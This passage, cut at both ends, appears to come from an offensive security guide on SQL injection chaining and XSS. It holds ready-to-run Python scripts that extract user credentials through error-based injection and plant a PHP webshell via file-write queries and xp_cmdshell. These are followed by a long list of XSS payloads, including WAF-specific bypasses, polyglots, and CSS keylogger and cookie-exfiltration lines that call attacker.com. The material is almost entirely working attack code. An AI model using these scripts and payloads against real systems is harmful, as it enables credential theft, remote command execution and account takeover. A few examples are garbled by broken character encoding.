'; SELECT extractvalue(1, CONCAT('~', (SELECT GROUP_CONCAT(username,':',password) FROM users)));--

-- PostgreSQL error-based
'; SELECT CAST((SELECT password FROM users LIMIT 1) AS INT);--

-- Oracle error-based
'; SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE ROWNUM=1)) FROM dual;--
```

**Automated error-based chaining:**

```python
#!/usr/bin/env python3
import requests
import re

def error_based_chain_extraction(url, param, dbms):
    """
    Extract data via error-based SQL injection chaining
    """
    if dbms.lower() == "mysql":
        # Extract using extractvalue
        payload = "' AND extractvalue(1, CONCAT('~', (SELECT GROUP_CONCAT(username,':',password SEPARATOR '|') FROM users)))-- -"
        
    elif dbms.lower() == "mssql":
        # Extract using RAISERROR
        payload = """'; DECLARE @data VARCHAR(8000);
        SET @data = (SELECT STRING_AGG(username+':'+password, '|') FROM users);
        RAISERROR(@data, 16, 1);--"""
        
    elif dbms.lower() == "postgresql":
        # Extract using type casting error
        payload = "' AND 1=CAST((SELECT string_agg(username||':'||password, '|') FROM users) AS INTEGER)-- -"
    
    else:
        print(f"[-] Unsupported DBMS: {dbms}")
        return None
    
    print(f"[*] Sending error-based payload...")
    params = {param: payload}
    
    try:
        response = requests.get(url, params=params)
        
        # Extract data from error message
        # MySQL extractvalue error pattern
        mysql_pattern = r"XPATH syntax error: '~(.+?)'"
        # MSSQL error pattern
        mssql_pattern = r"(.+?)\r\nUnclosed quotation"
        # PostgreSQL pattern
        pgsql_pattern = r'invalid input syntax for (?:type )?integer: "(.+?)"'
        
        patterns = [mysql_pattern, mssql_pattern, pgsql_pattern]
        
        for pattern in patterns:
            match = re.search(pattern, response.text, re.DOTALL)
            if match:
                data = match.group(1)
                print(f"[+] EXTRACTED DATA:")
                
                # Parse and display
                entries = data.split('|')
                for entry in entries:
                    if ':' in entry:
                        user, pwd = entry.split(':', 1)
                        print(f"    Username: {user}, Password: {pwd}")
                
                return entries
        
        print("[-] No data found in error message")
        print(f"[*] Response excerpt: {response.text[:500]}")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

# Extract all user credentials
credentials = error_based_chain_extraction(
    url="http://target.com/product",
    param="id",
    dbms="mysql"
)
```

### Write File Chaining

**File write exploitation chains:**

```sql
-- MySQL INTO OUTFILE chaining
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';--

-- Multiple file writes
'; SELECT 'line1' INTO OUTFILE '/tmp/file1.txt';
   SELECT 'line2' INTO OUTFILE '/tmp/file2.txt';--

-- PostgreSQL COPY TO chaining
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';--

-- MSSQL bulk insert preparation and file write
'; CREATE TABLE tmp (content VARCHAR(8000));
   INSERT INTO tmp VALUES('<?php system($_GET["cmd"]); ?>');
   EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.tmp" queryout "C:\\inetpub\\wwwroot\\shell.php" -c -T';--
```

**Automated webshell deployment:**

```python
#!/usr/bin/env python3
import requests

def deploy_webshell_via_sqli(url, param, dbms, webroot):
    """
    Deploy webshell via SQL injection file write
    """
    shell_content = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
    shell_path = f"{webroot}/shell.php"
    
    if dbms.lower() == "mysql":
        payload = f"'; SELECT '{shell_content}' INTO OUTFILE '{shell_path}';--"
        
    elif dbms.lower() == "postgresql":
        payload = f"'; COPY (SELECT '{shell_content}') TO '{shell_path}';--"
        
    elif dbms.lower() == "mssql":
        payload = f"""'; CREATE TABLE shell_tmp (content VARCHAR(8000));
        INSERT INTO shell_tmp VALUES('{shell_content}');
        EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.shell_tmp" queryout "{shell_path}" -c -T';
        DROP TABLE shell_tmp;--"""
    
    else:
        print(f"[-] Unsupported DBMS: {dbms}")
        return False
    
    print(f"[*] Deploying webshell to: {shell_path}")
    params = {param: payload}
    
    try:
        response = requests.get(url, params=params)
        
        # Verify shell deployment
        shell_url = url.rsplit('/', 1)[0] + "/shell.php?cmd=id"
        verify_response = requests.get(shell_url)
        
        if verify_response.status_code == 200 and "uid=" in verify_response.text:
            print(f"[+] WEBSHELL DEPLOYED SUCCESSFULLY")
            print(f"[+] Access at: {shell_url}")
            return True
        else:
            print(f"[-] Webshell deployment uncertain")
            print(f"[*] Try accessing: {shell_url}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

# Deploy webshell
deploy_webshell_via_sqli(
    url="http://target.com/product",
    param="id",
    dbms="mysql",
    webroot="/var/www/html"
)
```

## Important Subtopics and Related Areas

**Advanced SQLi subtopics to explore further:**

- WAF bypass techniques (encoding, fragmentation, protocol smuggling)
- Boolean-based blind injection optimization
- Database fingerprinting and version detection
- XML/JSON column injection in modern databases
- Cloud database-specific injection (Aurora, Azure SQL, Cloud SQL)
- GraphQL injection techniques
- ORM injection vulnerabilities

**Related exploitation areas:**

- LDAP injection combined with SQL chaining
- Command injection via database functions
- Template injection in database-driven applications
- Mass assignment vulnerabilities in NoSQL contexts

---

# Advanced XSS Techniques

## Mutation-Based XSS (mXSS)

Mutation XSS occurs when the browser's HTML parser mutates benign-looking input into executable code during DOM operations or sanitization processes.

### DOM Mutation Patterns

**innerHTML Mutations**

```html
<!-- Input passes sanitizer -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After innerHTML assignment, browser parses: -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>">

<!-- The </noscript> inside title attribute closes the noscript tag -->
```

**Attribute Mutation**

```html
<!-- Sanitizer allows: -->
<form><input name="attributes"></form>

<!-- After DOM manipulation: -->
document.body.innerHTML = '<form><input name="attributes"></form>';

<!-- Creates form.attributes property collision -->
<!-- Can override form.attributes to bypass checks -->
```

**Namespace Confusion**

```html
<!-- SVG namespace mutation -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- Browser interprets <img> as HTML, not SVG -->
<!-- Executes onerror handler -->
```

**MathML/SVG Integration Mutations**

```html
<!-- Input: -->
<math><mi><svg><style><img src=x onerror=alert(1)>

<!-- Browser auto-closes tags differently -->
<math><mi></mi></math><svg><style></style></svg><img src=x onerror=alert(1)>
```

### Template Literal Mutations

**Backtick Context**

```javascript
// Sanitizer escapes quotes
var msg = `User input: ${userInput}`;

// Attack: ${alert(1)}
// Results in: var msg = `User input: ${alert(1)}`;
```

**CSS Mutation**

```html
<!-- Sanitized input -->
<div style="background:url('safe.jpg')"></div>

<!-- Mutation via CSS parsing -->
<div style="background:url('</style><img src=x onerror=alert(1)>')"></div>
```

### Character Encoding Mutations

**UTF-7 BOM Mutation**

```html
<!-- If charset not declared early -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- Browser may interpret as UTF-7 before charset declaration -->
```

**Overlong UTF-8**

```html
<!-- Overlong encoding bypasses filters -->
%C0%BCscript%C0%BE  â†’ <script>
%E0%80%BCscript%E0%80%BE

<!-- Some parsers normalize differently than validators -->
```

**Unicode Normalization**

```html
<!-- NFC vs NFD normalization differences -->
\u003Cscript\u003E  â†’ <script>

<!-- Compatibility forms -->
ï¼œscriptï¼ž  (U+FF1C, U+FF1E fullwidth)
```

### Tool: DOMPurify Bypass Research

```bash
# Clone DOMPurify test cases
git clone https://github.com/cure53/DOMPurify.git
cd DOMPurify/test

# Study bypass patterns
grep -r "mutation" test/

# Test mutation vectors
node test-mutations.js
```

## Browser Quirks and Parsing Differences

### Chrome/Chromium Quirks

**Blink Parser Behavior**

```html
<!-- Auto-closes certain tags -->
<svg><script>alert(1)</svg>
<!-- Interpreted as: <svg></svg><script>alert(1)</script> -->

<!-- Form-associated elements -->
<form><isindex type=image src=1 onerror=alert(1)>
<!-- isindex creates implicit form controls -->

<!-- Template element quirks -->
<template><img src=x onerror=alert(1)></template>
<script>document.body.appendChild(document.querySelector('template').content)</script>
```

**V8 JavaScript Engine Quirks**

```javascript
// Unicode variable names
var \u0061lert = alert;
\u0061lert(1);

// Private fields bypass
class XSS { #x = alert(1); constructor() { this.#x } }
new XSS();
```

### Firefox/Gecko Quirks

**Mozilla Parser Differences**

```html
<!-- XML parsing in HTML context -->
<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>

<!-- XBL bindings (older versions) -->
<div style="-moz-binding:url(data:text/xml,<?xml version='1.0'?><bindings xmlns='http://www.mozilla.org/xbl'><binding id='x'><implementation><constructor>alert(1)</constructor></implementation></binding></bindings>#x)">

<!-- Document.all quirk -->
if (document.all) { /* Firefox treats as falsy but exists */ }
```

**SpiderMonkey Engine Quirks**

```javascript
// Function decompilation
Function.prototype.toString.call(alert)
// May reveal source in older versions

// Generator expressions
(alert(1) for (x in [1]))
```

### Safari/WebKit Quirks

**WebKit Parser Behaviors**

```html
<!-- Case-insensitive attribute matching -->
<img SrC=x OnErRoR=alert(1)>

<!-- Input type=image special handling -->
<input type=image src=x onerror=alert(1)>

<!-- Frameset quirk -->
<frameset onload=alert(1)>
```

**JavaScriptCore Quirks**

```javascript
// Numeric separators
alert(1_000_000)  // Valid syntax

// Optional chaining with function calls
(alert?.(1))

// Logical assignment
x ??= alert(1)
```

### Internet Explorer/Legacy Edge Quirks

**IE Conditional Comments**

```html
<!--[if IE]>
<script>alert(1)</script>
<![endif]-->

<!-- VBScript execution -->
<script language="VBScript">MsgBox "XSS"</script>

<!-- Expression() in CSS -->
<div style="width:expression(alert(1))">
```

**Trident Engine Quirks**

```javascript
// Legacy ActiveX
new ActiveXObject("WScript.Shell").Run("calc");

// IE-specific events
<img src=x onactivate=alert(1)>
<input onfocusin=alert(1)>
```

### Cross-Browser Parsing Differences

**Tag Nesting Variations**

```html
<!-- Different auto-closing behaviors -->
<table><script>alert(1)</script></table>
<!-- Chrome: executes | Firefox: executes | Safari: executes -->

<select><script>alert(1)</script></select>
<!-- Results vary by browser -->

<!-- Void elements -->
<br><script>alert(1)</script>
<!-- Some browsers close immediately, others don't -->
```

**Attribute Parsing Differences**

```html
<!-- Unquoted attribute edge cases -->
<img src=x onerror=alert(1)//
<img src=x onerror=alert`1`>
<img src=x onerror=alert(1)<!--

<!-- Tab/newline handling -->
<img src=x onerror
=
alert(1)>

<!-- Null byte handling -->
<img src=x onerror=alert(1)%00>
```

**Event Handler Contexts**

```html
<!-- Different execution contexts -->
<body onload=alert(document.domain)>
<svg onload=alert(document.domain)>
<marquee onstart=alert(document.domain)>

<!-- Order of execution varies -->
```

## XSS in Different Contexts

### SVG Context

**Basic SVG XSS Vectors**

```html
<!-- Script execution -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
<svg><script href="data:text/javascript,alert(1)"/>

<!-- Animation-based -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>

<!-- Foreign object -->
<svg><foreignObject><body onload=alert(1)></foreignObject>
```

**SVG Attribute Injection**

```html
<!-- Event handlers in various elements -->
<circle onload=alert(1)>
<ellipse onload=alert(1)>
<path onload=alert(1)>
<polygon onload=alert(1)>
<text onload=alert(1)>

<!-- XLink namespace -->
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
```

**SVG Data URI**

```html
<!-- Embedded SVG via data URI -->
<object data="data:image/svg+xml,<svg onload=alert(1)>"></object>

<embed src="data:image/svg+xml,<svg onload=alert(1)>">

<iframe src="data:image/svg+xml,<svg onload=alert(1)>"></iframe>

<!-- Base64 encoded -->
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
```

**SVG CSS Injection**

```html
<svg><style>*{color:red;}</style><text x="0" y="15">XSS</text></svg>

<!-- External stylesheet -->
<svg><style>@import url("data:text/css,*{background:url('javascript:alert(1)')}")</style></svg>
```

**Advanced SVG Techniques**

```html
<!-- SMIL animation -->
<svg><animate xlink:href="#x" attributeName="href" values="javascript:alert(1)" begin="0s" />
<a id="x"><text>XSS</text></a></svg>

<!-- Use element with fragment -->
<svg><use href="#x"></use><g id="x"><script>alert(1)</script></g></svg>

<!-- Filter primitive -->
<svg><filter id="x"><feImage href="javascript:alert(1)"/></filter><rect filter="url(#x)"/></svg>
```

### MathML Context

**Basic MathML XSS**

```html
<!-- Event handlers -->
<math><maction actiontype="statusline#http://example.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>

<math href="javascript:alert(1)">CLICKME</math>

<!-- With mtext -->
<math><mtext><table background="javascript:alert(1)"></table></mtext></math>
```

**MathML Integration**

```html
<!-- MathML + SVG -->
<math><mi><svg><script>alert(1)</script></svg></mi></math>

<!-- Foreign object in MathML -->
<math><mtext><svg><foreignObject><body onload=alert(1)></foreignObject></svg></mtext></math>

<!-- Annotation-xml -->
<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>
```

**MathML Style Injection**

```html
<math><mstyle style="background:url('javascript:alert(1)')">
<math><ms>javascript:alert(1)</ms></math>
```

### Data URL Context

**JavaScript Data URLs**

```html
<!-- Direct execution -->
<script src="data:text/javascript,alert(1)"></script>

<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<object data="data:text/html,<script>alert(1)</script>"></object>

<embed src="data:text/html,<script>alert(1)</script>">
```

**Base64 Encoded Payloads**

```html
<!-- Standard base64 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

<!-- With charset -->
<iframe src="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

<!-- URL-safe base64 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg"></iframe>
```

**CSS Data URLs**

```html
<style>@import "data:text/css,body{background:url('javascript:alert(1)')}";</style>

<link rel="stylesheet" href="data:text/css,body{background:url('javascript:alert(1)')}">

<div style="background:url('data:image/svg+xml,<svg onload=alert(1)>')">
```

**Image Data URLs with Polyglots**

```html
<!-- GIF + HTML polyglot -->
data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7<script>alert(1)</script>

<!-- PNG + HTML -->
data:image/png;base64,iVBORw0KGgoAAAANSUhEUg...<script>alert(1)</script>
```

### JavaScript String Context

**Template Literals**

```javascript
// Breaking out of template literal
`${alert(1)}`
`${eval('alert(1)')}`
`${constructor.constructor('alert(1)')()}`

// Tagged templates
String.raw`${alert(1)}`
```

**String Concatenation**

```javascript
// Breaking quotes
'user input'-alert(1)-'
"user input"-alert(1)-"

// Comment injection
'; alert(1)//
'; alert(1)/*

// Multiline strings
'; alert(1)\n//
```

**Unicode Escapes**

```javascript
// Unicode escape sequences
\u0061lert(1)  // alert
\u{61}lert(1)  // ES6

// Hex escapes
\x61lert(1)

// Octal (strict mode prohibited)
\141lert(1)
```

### JSON Context

**JSON Injection to XSS**

```javascript
// Vulnerable code
var data = JSON.parse('{"name":"' + userInput + '"}');

// Attack payload
"}; alert(1)//

// Results in
var data = JSON.parse('{"name":""}; alert(1)//"}');
```

**JSONP Callback Hijacking**

```javascript
// Vulnerable JSONP endpoint
callback({"data":"value"})

// Attacker controls callback parameter
?callback=alert(1)//
?callback=<script>alert(1)</script>//
```

**JSON with HTML Injection**

```html
<!-- JSON rendered in HTML without encoding -->
<script>
var config = {"title":"<img src=x onerror=alert(1)>"};
document.write(config.title);
</script>
```

### CSS Context

**CSS Injection to XSS**

```css
/* Expression (IE) */
div { width: expression(alert(1)); }

/* Import with data URI */
@import "data:text/css,body{background:url('javascript:alert(1)')}";

/* URL with JavaScript */
background: url('javascript:alert(1)');

/* Attribute selector */
input[value*="x"] { background: url('//attacker.com/?'+document.cookie); }
```

**CSS Keylogger**

```css
/* Steal form inputs */
input[name="password"][value^="a"] { background: url('//attacker.com/?char=a'); }
input[name="password"][value^="b"] { background: url('//attacker.com/?char=b'); }
/* ... repeat for all characters */
```

## Bypassing WAF and Filters

### Character Encoding Bypass

**HTML Entity Encoding**

```html
<!-- Decimal entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Hex entities -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- Mixed encoding -->
<img src=x onerror=&#97;l&#101;rt&#40;1&#41;>

<!-- Without semicolons (browsers are lenient) -->
<img src=x onerror=&#97&#108&#101&#114&#116(1)>
```

**JavaScript Encoding**

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<script>\x61\x6c\x65\x72\x74(1)</script>

<script>eval('\u0061lert(1)')</script>

<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

**URL Encoding**

```html
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

<!-- Double encoding -->
<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529"></iframe>

<!-- Mixed with Unicode -->
<iframe src="javascript:\u0061lert%281%29"></iframe>
```

### Case Variation

**Mixed Case Tags**

```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x oNeRrOr=alert(1)>
<SvG OnLoAd=alert(1)>
<BoDy OnLoAd=alert(1)>
```

**Case in Event Handlers**

```html
<img src=x ONERROR=alert(1)>
<img src=x oNeRrOr=alert(1)>
<img src=x OnErRoR=alert(1)>
```

### Whitespace and Special Characters

**Alternative Whitespace**

```html
<!-- Tab -->
<img src=x	onerror=alert(1)>

<!-- Newline -->
<img src=x
onerror=alert(1)>

<!-- Form feed -->
<img src=x onerror=alert(1)>

<!-- Null byte (some contexts) -->
<img src=x onerror=alert(1)>

<!-- Multiple spaces -->
<img  src=x  onerror=alert(1)>
```

**Comment Insertion**

```html
<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>

<img src=x one<!---->rror=alert(1)>

<svg/onload=alert(1)>
```

**Line Continuation**

```javascript
<script>al\
ert(1)</script>

<script>ale\
rt(1)</script>
```

### Attribute Breaking

**Quote Variants**

```html
<!-- No quotes -->
<img src=x onerror=alert(1)>

<!-- Single quotes -->
<img src='x' onerror='alert(1)'>

<!-- Double quotes -->
<img src="x" onerror="alert(1)">

<!-- Backticks (not standard but some parsers accept) -->
<img src=`x` onerror=`alert(1)`>
```

**Breaking Out of Attributes**

```html
<!-- From href -->
" onload="alert(1)
" autofocus onfocus="alert(1)

<!-- From src -->
x" onerror="alert(1)
x' onerror='alert(1)

<!-- From style -->
;} body{background:url('javascript:alert(1)')
</style><script>alert(1)</script><style>
```

### Tag Obfuscation

**Self-Closing Tags**

```html
<script/>alert(1)</script>
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

**Unclosed Tags**

```html
<script>alert(1)
<img src=x onerror=alert(1)
<svg onload=alert(1)
```

**Nested Tags**

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img<img> src=x onerror=alert(1)>
```

### Protocol Handler Bypass

**Alternative Protocols**

```html
<!-- JavaScript -->
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)"></iframe>

<!-- Data URLs -->
<a href="data:text/html,<script>alert(1)</script>">Click</a>

<!-- VBScript (IE) -->
<a href="vbscript:MsgBox 1">Click</a>

<!-- About -->
<iframe src="about:blank" onload="this.contentDocument.write('<script>alert(1)</script>')"></iframe>
```

**Protocol Obfuscation**

```html
<a href="jav	ascript:alert(1)">Click</a>
<a href="jav&#x0A;ascript:alert(1)">Click</a>
<a href="jav&#x09;ascript:alert(1)">Click</a>
<a href="j&#97;vascript:alert(1)">Click</a>
```

### Filter Keyword Bypass

**String Concatenation**

```javascript
<script>eval('ale'+'rt(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>window['al'+'ert'](1)</script>
```

**Property Access**

```javascript
<script>window['alert'](1)</script>
<script>self['alert'](1)</script>
<script>top['alert'](1)</script>
<script>parent['alert'](1)</script>
```

**Template Strings**

```javascript
<script>eval(`alert(1)`)</script>
<script>Function`a${`alert(1)`}```</script>
```

**Constructor Access**

```javascript
<script>[].constructor.constructor('alert(1)')()</script>
<script>''['constructor']['constructor']('alert(1)')()</script>
```

### Alternative Event Handlers

**Lesser-Known Events**

```html
<body onpageshow=alert(1)>
<body onbeforeprint=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video onloadstart=alert(1) src=x>
<audio onloadstart=alert(1) src=x>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<body onhashchange=alert(1)><a href=#>click</a>
```

**Form Events**

```html
<form><button formaction="javascript:alert(1)">Submit</button></form>
<form><input type="submit" formaction="javascript:alert(1)"></form>
<form><button popovertarget=x>Show</button><div popover id=x onbeforetoggle=alert(1)>
```

### DOM Clobbering for WAF Bypass

**Bypass Sanitization Checks**

```html
<!-- Clobber getElementById -->
<img name="getElementById" src=x>
<script>
// document.getElementById now returns img element
// May bypass checks that use getElementById
</script>

<!-- Clobber window properties -->
<form name="alert"><input id="1"></form>
<script>
// window.alert is now the form element
// Alternative: top.alert(1), parent.alert(1), self.alert(1)
</script>
```

**Bypass CSP via DOM Clobbering**

```html
<!-- If script checks window.config -->
<a id="config" href="data:,alert(1)"></a>
<script>
if (window.config) {
  location = window.config.href; // Redirects to data URI
}
</script>
```

### Polyglot Payloads

**HTML+JavaScript+SVG Polyglot**

```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

**Multiple Context Polyglot**

```html
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

### WAF-Specific Bypasses

**ModSecurity Bypass**

```html
<!-- Tag spacing -->
<img/src=x/onerror=alert(1)>

<!-- Mixed encoding -->
<img src=x on&#101;rror=alert(1)>

<!-- Comment breaking -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

**Cloudflare WAF Bypass**

```html
<!-- Rare attributes -->
<input accesskey="x" onclick="alert(1)">

<!-- Animation events -->
<marquee width=10 loop=2 behavior=alternate onfinish=alert(1)>

<!-- Form-related -->
<form><button formaction=javascript:alert(1)>X</button>
```

**AWS WAF Bypass**

```html
<!-- Polyglot approach -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Data URI with base64 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Testing Tools

```bash
# XSS Polyglot Generator
git clone https://github.com/0xsobky/HackVault.git
cd HackVault/XSS

# XSStrike - Advanced XSS detection
git clone https://github.com/s0md3v/XSStrike.git
python3 xsstrike.py -u "http://target.com/page?param=test"

# Dalfox - Parameter analysis and XSS scanning
go install github.com/hahwul/dalfox/v2@latest
dalfox url http://target.com/search?q=test

# Manual testing with Burp Suite
# Use Intruder with payload lists:
# /usr/share/seclists/Fuzzing/XSS/*

# Browser-based testing
# Open Developer Console (F12)
# Test payloads directly in console
```

### Payload Encoding Tools

```bash
# HTML entity encoder
echo "alert(1)" | sed 's/./\&#x&;/g'

# JavaScript Unicode encoder
python3 -c "print(''.join([r'\u{:04x}'.format(ord(c)) for c in 'alert(1)']))"

# Base64 encoding
echo '<script>alert(1)</script>' | base64

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('alert(1)'))"
```

**Related Topics**: Content Security Policy (CSP) Bypass, DOM-Based XSS Exploitation, Stored XSS in NoSQL Databases, XSS to Account Takeover Chains

---

## Unicode and Encoding Exploits

### Unicode Normalization Attacks

Unicode provides multiple representations for the same visual character, which can bypass filters that check for specific byte sequences.

**Unicode Equivalents for Script Execution:**

```javascript
// Standard script tag
<script>alert(1)</script>

// Unicode variations (may bypass simple filters)
<script>alert\u0028 1\u0029</script>
<script>\u0061lert(1)</script>  // 'a' as unicode
<script>eval('\u0061lert(1)')</script>

// Overlong UTF-8 encoding [Unverified - depends on parser behavior]
%C0%BCscript%C0%BE  // Represents <script>
```

**Homoglyph Substitution:**

```javascript
// Cyrillic 'Ð°' (U+0430) looks like Latin 'a' (U+0061)
<script>Ð°lert(1)</script>  // Using Cyrillic 'a'

// Greek omicron 'Î¿' (U+03BF) vs Latin 'o' (U+006F)
<script>cÎ¿nsole.log(1)</script>
```

**Zero-Width Characters:**

```javascript
// Zero-width space (U+200B) injection
<img src=x oâ€‹nerror=alert(1)>  // Zero-width space between 'o' and 'nerror'

// Zero-width non-joiner (U+200C) and joiner (U+200D)
<svg/onâ€Œload=alert(1)>
```

### HTML Entity Encoding Exploits

**Decimal and Hexadecimal Entities:**

```html
<!-- Decimal HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Hexadecimal entities -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- Mixed encoding -->
<img src=x onerror="al&#101;rt(1)">

<!-- Without semicolons (context-dependent parsing) -->
<img src=x onerror="&#97lert(1)">
```

**JavaScript String Encoding:**

```javascript
// Hex escape sequences
<script>\x61lert(1)</script>

// Unicode escape sequences
<script>\u0061lert(1)</script>

// Octal escape sequences
<script>\141lert(1)</script>

// Template literals with encoding
<script>`\u0061lert(1)`</script>
```

**URL Encoding Contexts:**

```html
<!-- Double URL encoding -->
<a href="javascript:%2561lert(1)">Click</a>
<!-- %25 = %, %61 = 'a', decoded twice becomes alert(1) -->

<!-- Data URI with base64 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Data URI with plain encoding -->
<iframe src="data:text/html,<script>alert(1)</script>">
```

### Character Set Exploits

**UTF-7 XSS ([Unverified - requires specific server configuration]):**

```html
<!-- If Content-Type charset=UTF-7 -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- UTF-7 encoded <script>alert(1)</script> -->
```

**Byte Order Mark (BOM) Injection:**

```html
<!-- UTF-8 BOM (0xEF 0xBB 0xBF) may bypass filters -->
ï»¿<script>alert(1)</script>
```

**ISO-8859-1 vs UTF-8 Confusion:**

```html
<!-- Character 0xC0 in ISO-8859-1 represents Ã€ -->
<!-- If parsed as UTF-8, may cause interpretation issues -->
<script>alÃ€ert(1)</script>
```

---

## Event Handler Exploitation

### Comprehensive Event Handler List

**Standard DOM Events:**

```html
<!-- Mouse events -->
<img src=x onmouseover=alert(1)>
<div onmouseenter=alert(1)>Hover</div>
<span onmousemove=alert(1)>Move</span>
<input onmousedown=alert(1)>
<button onmouseup=alert(1)>Click</button>
<a href="#" onclick=alert(1)>Link</a>
<area onmouseleave=alert(1)>

<!-- Keyboard events -->
<input onkeydown=alert(1)>
<textarea onkeyup=alert(1)></textarea>
<input onkeypress=alert(1)>

<!-- Focus events -->
<input onfocus=alert(1) autofocus>
<select onblur=alert(1)><option>X</option></select>
<input onfocusin=alert(1)>
<input onfocusout=alert(1)>

<!-- Form events -->
<form onsubmit=alert(1)><input type=submit></form>
<input onchange=alert(1)>
<input oninput=alert(1)>
<form onreset=alert(1)><input type=reset></form>
<select oninvalid=alert(1) required><option></option></select>

<!-- Load/Error events -->
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe onload=alert(1) src="about:blank"></iframe>
<script onerror=alert(1) src=x></script>
<link rel=stylesheet href=x onerror=alert(1)>
<video onerror=alert(1) src=x>
<audio onerror=alert(1) src=x>
```

**Advanced and Lesser-Known Handlers:**

```html
<!-- Animation events -->
<style>@keyframes x{}</style><div onanimationstart=alert(1) style="animation:x"></div>
<div onanimationend=alert(1) style="animation:x 1s"></div>
<div onanimationiteration=alert(1) style="animation:x 1s infinite"></div>

<!-- Transition events -->
<div ontransitionend=alert(1) style="transition:1s" onload=this.style.color='red'>

<!-- Drag events -->
<div draggable=true ondragstart=alert(1)>Drag me</div>
<div ondrop=alert(1) ondragover=event.preventDefault()>Drop here</div>
<div ondrag=alert(1) draggable=true>

<!-- Clipboard events -->
<input oncopy=alert(1) value="Copy this">
<input oncut=alert(1) value="Cut this">
<input onpaste=alert(1)>

<!-- Media events -->
<video oncanplay=alert(1) src=x></video>
<audio oncanplaythrough=alert(1) src=x></audio>
<video ondurationchange=alert(1) src=x></video>
<video onended=alert(1) src=x autoplay></video>
<video onloadeddata=alert(1) src=validvideo.mp4></video>
<video onloadedmetadata=alert(1) src=x></video>
<video onloadstart=alert(1) src=x></video>
<video onpause=alert(1) src=x autoplay></video>
<video onplay=alert(1) src=x autoplay></video>
<video onplaying=alert(1) src=x autoplay></video>
<video onprogress=alert(1) src=x></video>
<video onseeking=alert(1) src=x></video>
<video onseeked=alert(1) src=x></video>
<video ontimeupdate=alert(1) src=validvideo.mp4 autoplay></video>
<video onvolumechange=alert(1) src=x></video>

<!-- Miscellaneous events -->
<marquee onstart=alert(1)>Text</marquee>
<marquee onbounce=alert(1)>Text</marquee>
<marquee onfinish=alert(1) loop=1>Text</marquee>
<body onpageshow=alert(1)>
<body onpagehide=alert(1)>
<details ontoggle=alert(1) open>
<dialog onclose=alert(1) open>
```

### Event Handler Without Quotes or Parentheses

**Using Expression Variations:**

```html
<!-- Using template literals -->
<img src=x onerror=alert`1`>

<!-- Using Function constructor -->
<img src=x onerror=Function`a=alert``a`1```>

<!-- Using eval with encoded string -->
<img src=x onerror=eval(atob`YWxlcnQoMSk`)>  <!-- alert(1) in base64 -->

<!-- Location redirect alternative -->
